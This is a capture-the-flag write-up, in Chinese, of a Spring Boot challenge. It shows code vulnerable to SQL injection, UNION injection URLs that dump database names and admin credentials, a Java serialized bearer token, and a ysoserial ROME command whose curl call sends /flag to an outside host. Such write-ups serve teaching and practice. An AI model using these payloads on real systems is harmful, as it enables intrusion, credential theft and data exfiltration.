## 网鼎杯-朱雀组-thinkjava (springboot)


### Test.java

```
package cn.abc.core.controller;

import cn.abc.common.bean.ResponseCode;
import cn.abc.common.bean.ResponseResult;
import cn.abc.common.security.annotation.Access;
import cn.abc.core.sqldict.SqlDict;
import io.swagger.annotations.ApiOperation;
import java.io.IOException;
import java.util.List;
import org.springframework.web.bind.annotation.CrossOrigin;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

@CrossOrigin
@RestController
@RequestMapping({"/common/test"})
public class Test {
   @PostMapping({"/sqlDict"})
   @Access
   @ApiOperation("为了开发方便对应数据库字典查询")
   public ResponseResult sqlDict(String dbName) throws IOException {
      List tables = SqlDict.getTableData(dbName, "root", "abc@12345");
      return ResponseResult.e(ResponseCode.OK, tables);
   }
}

```

### SqlDict.java

```
package cn.abc.core.sqldict;

import java.sql.Connection;
import java.sql.DatabaseMetaData;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.sql.Statement;
import java.util.ArrayList;
import java.util.List;

public class SqlDict {
   public static Connection getConnection(String dbName, String user, String pass) {
      Connection conn = null;

      try {
         Class.forName("com.mysql.jdbc.Driver");
         if (dbName != null && !dbName.equals("")) {
            dbName = "jdbc:mysql://mysqldbserver:3306/" + dbName;
         } else {
            dbName = "jdbc:mysql://mysqldbserver:3306/myapp";
         }

         if (user == null || dbName.equals("")) {
            user = "root";
         }

         if (pass == null || dbName.equals("")) {
            pass = "abc@12345";
         }

         conn = DriverManager.getConnection(dbName, user, pass);
      } catch (ClassNotFoundException var5) {
         var5.printStackTrace();
      } catch (SQLException var6) {
         var6.printStackTrace();
      }

      return conn;
   }

   public static List getTableData(String dbName, String user, String pass) {
      List Tables = new ArrayList();
      Connection conn = getConnection(dbName, user, pass);
      String TableName = "";

      try {
         Statement stmt = conn.createStatement();
         DatabaseMetaData metaData = conn.getMetaData();
         ResultSet tableNames = metaData.getTables((String)null, (String)null, (String)null, new String[]{"TABLE"});

         while(tableNames.next()) {
            TableName = tableNames.getString(3);
            Table table = new Table();
            String sql = "Select TABLE_COMMENT from INFORMATION_SCHEMA.TABLES Where table_schema = '" + dbName + "' and table_name='" + TableName + "';";
            ResultSet rs = stmt.executeQuery(sql);

            while(rs.next()) {
               table.setTableDescribe(rs.getString("TABLE_COMMENT"));
            }

            table.setTableName(TableName);
            ResultSet data = metaData.getColumns(conn.getCatalog(), (String)null, TableName, "");
            ResultSet rs2 = metaData.getPrimaryKeys(conn.getCatalog(), (String)null, TableName);

            String PK;
            for(PK = ""; rs2.next(); PK = rs2.getString(4)) {
            }

            while(data.next()) {
               Row row = new Row(data.getString("COLUMN_NAME"), data.getString("TYPE_NAME"), data.getString("COLUMN_DEF"), data.getString("NULLABLE").equals("1") ? "YES" : "NO", data.getString("IS_AUTOINCREMENT"), data.getString("REMARKS"), data.getString("COLUMN_NAME").equals(PK) ? "true" : null, data.getString("COLUMN_SIZE"));
               table.list.add(row);
            }

            Tables.add(table);
         }
      } catch (SQLException var16) {
         var16.printStackTrace();
      }

      return Tables;
   }
}

```
从上面分析得知，网站采用的是mysql数据库，

mysql 常见默认数据库名字有：

```
information_schema
mysql
performance_schema
sy
```



## 0x00 swagger-ui

dirb 暴力破解得到一个路径

`http://d06cd6b2-9dd6-4a93-8ad9-13d91a89ca04.node3.buuoj.cn/swagger-ui.html`

## 0x01 myapp数据库

查询数据库里面所有数据库 `查询information_schema库中的schemata表的所有内容`

`select * from information_schema.schema;`

构造查询库sql语句 `GROUP_CONCAT函数返回一个字符串结果，该结果由分组中的值连接组合而成。`

`mysql#' union select group_concat(schema_name) from information_schema.schemata#`

`http://04d5d236-6051-4fbf-aaaf-e1beabeb7380.node3.buuoj.cn/common/test/sqlDict?dbName=mysql%23%27%20union%20select%20group_concat(schema_name)%20from%20information_schema.schemata%23`

得到：

`			"tableDescribe":"information_schema,myapp,mysql,performance_schema,sys",`

```
information_schema
myapp
mysql
performance_schema
sys
```

分析知，只有myapp不是默认数据库

## 0x02 查询myapp 数据库中所有表

`mysql#' union select group_concat(table_name) from information_schema.tables where table_schema="myapp"#`

`http://04d5d236-6051-4fbf-aaaf-e1beabeb7380.node3.buuoj.cn/common/test/sqlDict?dbName=mysql%23%27%20union%20select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema%3D%22myapp%22%23`

得到
```
"tableDescribe":"user",
"tableName":"user"
```

分析知，myapp数据库里面只有一个表

## 0x03 查询myapp数据库中user表的所有列

`mysql#' union select group_concat(column_name) from information_schema.columns where table_schema="myapp"#`

`http://d06cd6b2-9dd6-4a93-8ad9-13d91a89ca04.node3.buuoj.cn/common/test/sqlDict?dbName=mysql%23%27%20union%20select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_schema%3D%22myapp%22%23`


得到：
```
"tableDescribe":"id,name,pwd",
"tableName":"user"
```


## 0x04 查询myapp数据库user表，列id,name,pwd

`使用函数concat_ws() 指定参数之间的分隔符,第一个参数是其它参数的分隔符。`

`myapp#' union select concat_ws(",",id,name,pwd) from user#`

`http://d06cd6b2-9dd6-4a93-8ad9-13d91a89ca04.node3.buuoj.cn/common/test/sqlDict?dbName=myapp%23%27%20union%20select%20CONCAT_WS(%22%2C%22%2Cid%2Cname%2Cpwd)%20from%20user%23`

得到：
```
"tableDescribe":"1,admin,admin@Rrrr_ctf_asde",
```

账号：admin

密码：admin@Rrrr_ctf_asde


## 0x05 登陆账号，返回token认证信息

`账户相关 : User Controller `

```
post /common/user/current   获取当前用户信息

post /common/user/login     登录

```

### Burpsuite Request

```
POST /common/user/login HTTP/1.1
Host: d06cd6b2-9dd6-4a93-8ad9-13d91a89ca04.node3.buuoj.cn
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/json
Referer: http://d06cd6b2-9dd6-4a93-8ad9-13d91a89ca04.node3.buuoj.cn/swagger-ui.html
Content-Length: 65
X-Forwarded-For: 127.0.0.1
Connection: close

{
  "password": "admin@Rrrr_ctf_asde",
  "username": "admin"
}
```
### Burpsuite Response

```
HTTP/1.1 200 OK
Server: openresty
Date: Tue, 26 May 2020 03:36:56 GMT
Content-Type: application/json;charset=utf-8
Content-Length: 330
Connection: close
Access-Control-Allow-Headers: token,Origin, X-Requested-With, Content-Type, Accept
Access-Control-Allow-Methods: POST, GET, PUT, OPTIONS, DELETE, PATCH
Access-Control-Allow-Origin: *
Access-Control-Max-Age: 3600

{
	"data":"Bearer rO0ABXNyABhjbi5hYmMuY29yZS5tb2RlbC5Vc2VyVm92RkMxewT0OgIAAkwAAmlkdAAQTGphdmEvbGFuZy9Mb25nO0wABG5hbWV0ABJMamF2YS9sYW5nL1N0cmluZzt4cHNyAA5qYXZhLmxhbmcuTG9uZzuL5JDMjyPfAgABSgAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAAAAAAAAXQABWFkbWlu",
	"msg":"登陆成功",
	"status":2,
	"timestamps":1590464216351
}
```

得到：
`Bearer rO0ABXNyABhjbi5hYmMuY29yZS5tb2RlbC5Vc2VyVm92RkMxewT0OgIAAkwAAmlkdAAQTGphdmEvbGFuZy9Mb25nO0wABG5hbWV0ABJMamF2YS9sYW5nL1N0cmluZzt4cHNyAA5qYXZhLmxhbmcuTG9uZzuL5JDMjyPfAgABSgAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAAAAAAAAXQABWFkbWlu`

Bearer 后的数据base64 解码，发现是一个java 序列化数据

`echo rO0ABXNyABhjbi5hYmMuY29yZS5tb2RlbC5Vc2VyVm92RkMxewT0OgIAAkwAAmlkdAAQTGphdmEvbGFuZy9Mb25nO0wABG5hbWV0ABJMamF2YS9sYW5nL1N0cmluZzt4cHNyAA5qYXZhLmxhbmcuTG9uZzuL5JDMjyPfAgABSgAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAAAAAAAAXQABWFkbWlu |base64 -d >1.ser
`

```
file 1.ser 

1.ser: Java serialization data, version 5

```

```
cat 1.ser |xxd

00000000: aced 0005 7372 0018 636e 2e61 6263 2e63  ....sr..cn.abc.c
00000010: 6f72 652e 6d6f 6465 6c2e 5573 6572 566f  ore.model.UserVo
00000020: 7646 4331 7b04 f43a 0200 024c 0002 6964  vFC1{..:...L..id
00000030: 7400 104c 6a61 7661 2f6c 616e 672f 4c6f  t..Ljava/lang/Lo
00000040: 6e67 3b4c 0004 6e61 6d65 7400 124c 6a61  ng;L..namet..Lja
00000050: 7661 2f6c 616e 672f 5374 7269 6e67 3b78  va/lang/String;x
00000060: 7073 7200 0e6a 6176 612e 6c61 6e67 2e4c  psr..java.lang.L
00000070: 6f6e 673b 8be4 90cc 8f23 df02 0001 4a00  ong;.....#....J.
00000080: 0576 616c 7565 7872 0010 6a61 7661 2e6c  .valuexr..java.l
00000090: 616e 672e 4e75 6d62 6572 86ac 951d 0b94  ang.Number......
000000a0: e08b 0200 0078 7000 0000 0000 0000 0174  .....xp........t
000000b0: 0005 6164 6d69 6e                        ..admin
```

## 0x06 获取当前用户信息

`post /common/user/current`

### Burpsuite Request
```
POST /common/user/current HTTP/1.1
Host: d06cd6b2-9dd6-4a93-8ad9-13d91a89ca04.node3.buuoj.cn
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/json
Authorization: Bearer rO0ABXNyABhjbi5hYmMuY29yZS5tb2RlbC5Vc2VyVm92RkMxewT0OgIAAkwAAmlkdAAQTGphdmEvbGFuZy9Mb25nO0wABG5hbWV0ABJMamF2YS9sYW5nL1N0cmluZzt4cHNyAA5qYXZhLmxhbmcuTG9uZzuL5JDMjyPfAgABSgAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAAAAAAAAXQABWFkbWlu
Referer: http://d06cd6b2-9dd6-4a93-8ad9-13d91a89ca04.node3.buuoj.cn/swagger-ui.html
X-Forwarded-For: 127.0.0.1
Connection: close
Content-Length: 0


```

### Burpsuite Response
```
HTTP/1.1 200 OK
Server: openresty
Date: Tue, 26 May 2020 03:43:39 GMT
Content-Type: application/json;charset=utf-8
Content-Length: 108
Connection: close
Access-Control-Allow-Headers: token,Origin, X-Requested-With, Content-Type, Accept
Access-Control-Allow-Methods: POST, GET, PUT, OPTIONS, DELETE, PATCH
Access-Control-Allow-Origin: *
Access-Control-Max-Age: 3600

{
	"data":{
		"id":1,
		"name":"admin"
	},
	"msg":"操作成功",
	"status":1,
	"timestamps":1590464619681
}
```

基本可以确定header 头`Authorization`此处存在反序列化漏洞

## 0x07 确定使用Gaddet

使用BurpSuite插件 `Java Deserialization Scanner`

1. 设置存在漏洞的点 rO0ABXNyABhjb*
2. 点击，进行base64 攻击

```
SCANNING IN PROGRESS
Scanning can go on approximately from 1 second up to 3 minutes, based on the number of vulnerable libraries founded
```

稍等片刻

返回结果：
![](./ROME.png)
```
Results:
Apache Commons Collections 3 (Sleep): NOT vulnerable.
Spring Alternate Payload (Sleep): NOT vulnerable.
Apache Commons Collections 4 (Sleep): NOT vulnerable.
JSON (Sleep): NOT vulnerable.
Apache Commons Collections 3 Alternate payload 2 (Sleep): NOT vulnerable.
ROME (Sleep): Potentially VULNERABLE!!!
Apache Commons Collections 4 Alternate payload (Sleep): NOT vulnerable.
Java 8 (up to Jdk8u20) (Sleep): NOT vulnerable.
Java 6 and Java 7 (up to Jdk7u21) (Sleep): NOT vulnerable.
Hibernate 5 (Sleep): NOT vulnerable.
Commons BeanUtils (Sleep): NOT vulnerable.
Apache Commons Collections 3 Alternate payload 3 (Sleep): NOT vulnerable.
Spring (Sleep): NOT vulnerable.
Apache Commons Collections 3 Alternate payload (Sleep): NOT vulnerable.
END
IMPORTANT NOTE: High delayed networks may produce false positives!
```

其中，`ROME (Sleep): Potentially VULNERABLE!!!` 标红

## 0x08 利用ysoserial 生成payload

`java -jar ysoserial-0.0.6-SNAPSHOT-all.jar `

`ROME                @mbechler                              rome:1.0 `

`java -jar ysoserial-0.0.6-SNAPSHOT-all.jar ROME "curl http://x.x.x.x:8989 -d @/flag" > flag.bin`


